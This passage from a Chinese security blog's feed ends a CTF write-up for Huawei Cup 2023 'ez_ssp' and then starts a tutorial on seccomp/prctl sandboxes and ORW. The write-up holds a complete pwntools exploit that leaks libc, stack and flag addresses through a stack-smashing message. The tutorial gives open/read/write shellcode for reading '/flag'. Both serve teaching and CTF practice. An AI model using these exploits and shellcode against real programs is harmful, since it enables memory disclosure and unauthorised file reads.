函数的真实地址，泄露出栈上环境变量的首地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp14.png" alt="华为杯2023-ez_ssp14.png"></p><p>在栈中可以进行验证：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="华为杯2023-ez_ssp15.png"></p><p>往上翻可以看到 flag 存储的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp16.png" alt="华为杯2023-ez_ssp16.png"></p><p>计算栈上环境变量的首地址与 flag 存储位置之间的偏移</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp17.png" alt="华为杯2023-ez_ssp17.png"></p><p>因此 <code>flag_addr = stack_addr - 0x178</code></p><p>第三次循环我们直接将 <code>__libc_argv[0]</code> 覆盖为 <code>flag_addr</code>，将 flag 打印出来</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp18.png" alt="华为杯2023-ez_ssp18.png"></p><p>不过这里的 flag 是加密后的，我们再将其异或还原即可</p><p>由于异或的参数与随机数有关，记得将 <code>random id</code> 记录下来：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp19.png" alt="华为杯2023-ez_ssp19.png"></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/opt/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 用 read_got_addr 覆盖 __libc_argv[0] 泄露 read 函数的真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"read_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 read 函数的真实地址计算 libc 基地址，同时得到 environ 的真实地址</span>libcbase <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"environ_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 用 environ 的真实地址覆盖 __libc_argv[0] 泄露栈上环境变量的首地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 由于栈上环境变量的首地址与 flag 在栈上的位置相距 0x178，计算 flag 在栈上的真实地址</span>flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x178</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 用 flag 在栈上的真实地址覆盖 __libc_argv[0] 泄露加密后的 flag</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Your random id is: '</span><span class="token punctuation">)</span><span class="token comment"># 由于 flag 的加密与生成的随机数有关，注意到这个随机数是不变的，获取随机数</span>random <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random id -->"</span><span class="token punctuation">,</span> random<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>flag_enc <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_enc -->"</span><span class="token punctuation">,</span> flag_enc<span class="token punctuation">)</span><span class="token comment"># flag 的加密是简单的异或，因此异或解密还原 flag</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag_enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> random<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp20.png" alt="华为杯2023-ez_ssp20.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沙箱绕过与ORW</title>
      <link href="/posts/7a9990fc.html"/>
      <url>/posts/7a9990fc.html</url>
      
        <content type="html"><![CDATA[<h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><blockquote><p>沙箱技术是一种安全机制，目的在于为执行中的程序提供隔离环境，可以将沙箱理解为是一个虚拟系统程序，它创造了一个类似沙箱的独立作业环境，并且会把所有操作记录下来，在其内部运行的程序并不能对硬盘产生永久性的影响</p><p>沙箱是一个独立的虚拟环境，通过拦截系统调用，监视程序行为，可以用来测试不受信任的应用程序或上网行为</p></blockquote><hr><h2 id="沙箱和虚拟机的区别"><a href="#沙箱和虚拟机的区别" class="headerlink" title="沙箱和虚拟机的区别"></a>沙箱和虚拟机的区别</h2><blockquote><p>从表面和目的上来看，沙箱有点类似于物理主机和虚拟机之间的关系，但是它们之间并不完全等价</p><p>参考文章：<a href="https://blog.csdn.net/syy15270341019/article/details/133036033">沙箱和虚拟机的区别-CSDN博客</a></p></blockquote><ul><li>沙箱</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW1.png" alt="沙箱绕过与ORW1.png"></p><ol><li><p>沙箱是在现有的系统下，虚拟文件系统和注册表，通过底层驱动虚拟硬盘等操作，让你在虚拟的软件环境中运行应用程序</p></li><li><p>沙箱中的应用程序和其它应用程序共享机器的硬件资源，对系统资源消耗较少</p></li><li><p>当沙箱中的应用程序退出后，其所做的更改会被丢弃</p></li><li><p>沙箱在进行软件测试时，沙箱会接管病毒调用接口或函数的行为，并会在确认为病毒行为后实行回滚机制，让系统复原</p></li><li><p>沙箱一般来说是不能运行需要驱动加载的软件的</p></li></ol><ul><li>虚拟机</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW2.png" alt="沙箱绕过与ORW2.png"></p><ol><li><p>虚拟机是通过软件手段虚拟计算机的硬件设备，在现有的系统下建立一个全新的系统环境，在没有进行设置前，该系统环境无法与现有系统相互访问</p></li><li><p>虚拟机不和其它应用程序共享硬件资源，因此虚拟机对系统资源消耗较大</p></li><li><p>当虚拟机退出后，其所做的更改会被保存下来</p></li><li><p>虚拟机不具备回滚复原机制，在激发病毒后，虚拟机会根据病毒的行为特征判断为是某一类病毒，并调用引擎对该病毒进行清除</p></li><li><p> 虚拟机可以运行在正常系统下可以运行的软件，它可以享有属于自身的驱动程序</p></li></ol><blockquote><p>相对来说，虚拟机的安全性更高、技术比较稳定，很少有病毒可以攻破虚拟机使主机中毒</p><p>除此之外，虚拟机的用途更广泛</p></blockquote><hr><h2 id="沙箱保护的种类"><a href="#沙箱保护的种类" class="headerlink" title="沙箱保护的种类"></a>沙箱保护的种类</h2><blockquote><p>参考文章：<a href="https://xz.aliyun.com/t/12787?time__1311=mqmhDvrxkG8D/D0lD2DUh9Cr4cC+eD&alichlgref=https://www.google.com/">栈沙箱学习之orw - 先知社区</a></p></blockquote><p>在程序中通常会使用一个函数来创建沙箱，例如使用 <code>sandbox()</code> 函数开启沙箱保护</p><p><code>sandbox()</code> 函数通常有两种方式开启沙箱：<code>prctl</code> 函数调用、<code>seccomp</code> 库函数</p><blockquote><p>沙箱保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 ROP 调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p><p>当然，为了提高难度，有时候 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合也会被部分禁用</p></blockquote><ul><li>使用 <code>prctl()</code> 方式开启的沙箱</li></ul><p>函数定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token keyword">int</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> option<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg4<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg5<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>主要关注 <code>prctl()</code> 函数的第一个参数，<code>option</code> 的值代表被禁用的函数黑名单</p><ol><li><code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code></li></ol><p>当第一个参数为 38 时，表示禁用系统调用</p><p>第二个参数设置为 1，则禁用 execve 系统调用，对子进程同样生效</p><ol start="2"><li><code>prctl(22，2, &amp;v1)</code></li></ol><p>当第一个参数为 22 时，表示设置沙箱规则，从而可以实现改变函数的系统调用</p><p>第二个参数设置为 1，只允许调用 <code>read</code>、<code>write</code>、<code>_exit(not exit_group)</code>、<code>sigreturn</code> 这几个 <code>syscall</code></p><p>第二个参数设置为 2，过滤模式，通过参数 3 的结构体自定义过滤规则来对 <code>syscall</code> 进行限制</p><ul><li>使用 <code>seccomp()</code> 函数调用开启的沙箱</li></ul><p>函数定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) 和 SCMP_ACT_KILL( 0x00000000U)</span>  <span class="token comment">// seccomp 初始化，参数为 0 表示白名单模式，参数为 0x7fff0000U 则为黑名单模式</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// seccomp_rule_add 添加规则</span>  <span class="token comment">// v1 对应上面初始化的返回值</span>  <span class="token comment">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW</span>  <span class="token comment">// 第三个参数代表对应的系统调用号，0-->read / 1-->write / 2-->open / 60-->exit</span>  <span class="token comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">60LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">231LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// seccomp_load -> 将当前 seccomp 过滤器加载到内核中</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// seccomp_release -> 释放 seccomp 过滤器状态</span>    <span class="token comment">// 但对已经 load 的过滤规则不影响</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="沙箱保护的识别"><a href="#沙箱保护的识别" class="headerlink" title="沙箱保护的识别"></a>沙箱保护的识别</h2><p>使用工具 <code>seccomp-tools</code> 可以识别二进制程序是否开启了沙箱，并且禁止了哪些系统调用</p><p>安装 <code>seccomp-tools</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc ruby-devgem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">seccomp-tools dump 二进制程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW3.png" alt="沙箱绕过与ORW3.png"></p><p>重点注意最后的两句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0004: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过 <code>goto</code> 跳转的地址可以判断哪些系统调用是被禁止的，比如这里是禁用了 <code>execve</code></p><hr><h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><blockquote><p>顾名思义，就是 <code>open</code>、<code>read</code>、<code>write</code>：打开文件，将文件内容读取存储到某个位置，将文件内容打印出来</p><p><mark>这种方法不能获取 shell，但可以实现任意地址读和任意地址写</mark></p><p><strong>由于 <code>open()</code> 函数打开文件需要传入一个文件名，因此我们可能需要先在某个地址处写入文件名 <code>b&#39;/flag\x00&#39;</code>，然后将其地址作为参数传给 <code>open()</code> 函数</strong></p></blockquote><ul><li>32 位 ORW 系统调用号：</li></ul><table><thead><tr><th align="left">eax</th><th align="left">system call</th><th align="left">ebx</th><th align="left">ecx</th><th align="left">edx</th><th></th></tr></thead><tbody><tr><td align="left">3</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">4</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">5</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td></td></tr></tbody></table><p>其它类似功能的函数也是可以使用的，例如：<code>fopen()</code>、<code>fwrite()</code>，具体根据函数的传参调整寄存器即可</p><p>更多 32 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;syscall_32.tbl · torvalds&#x2F;linux · GitHub</a></p><ul><li>64 位 ORW 系统调用号：</li></ul><table><thead><tr><th align="left">rax</th><th align="left">system call</th><th align="left">rdi</th><th align="left">rsi</th><th align="left">rdx</th></tr></thead><tbody><tr><td align="left">0</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">1</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">2</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td></tr></tbody></table><p>其它类似功能的函数也是可以使用的，例如：<code>fopen()</code>、<code>fwrite()</code>、<code>open64()</code>，具体根据函数的传参调整寄存器即可</p><p>更多 64 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">linux&#x2F;syscall_64.tbl · torvalds&#x2F;linux · GitHub</a></p><hr><h2 id="Shellcode-型"><a href="#Shellcode-型" class="headerlink" title="Shellcode 型"></a>Shellcode 型</h2><blockquote><p><strong>适用于程序没有 NX 保护的时候</strong>，我们可以直接将指令写到栈上并执行</p><p>不过现在程序不开 NX 保护的情况几乎很少了，所以这种方法了解一下就好</p></blockquote><h3 id="32-位-ORW-构造"><a href="#32-位-ORW-构造" class="headerlink" title="32 位 ORW 构造"></a>32 位 ORW 构造</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ebx,1; mov eax,4; int 0x80; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果对汇编语言不熟悉，也可以利用 Pwntools 的 <code>shellcraft</code> 模块生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 声明程序架构为 32 位</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符3：其它打开的文件，将 flag 内容写入到 data_address 地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符1：输出到屏幕，打印地址 data_address 处存储的 flag 内容</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-位-ORW-构造"><a href="#64-位-ORW-构造" class="headerlink" title="64 位 ORW 构造"></a>64 位 ORW 构造</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor rdx,rdx; mov rsi,0; mov rdi,0x804a094; mov rax,2; syscall; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rsi,rdi; mov rdi,rax; mov rax,0; syscall; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rdi,1; mov rax,1; syscall; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果对汇编语言不熟悉，也可以利用 Pwntools 的 <code>shellcraft</code> 模块生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 声明程序架构为 64 位</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token 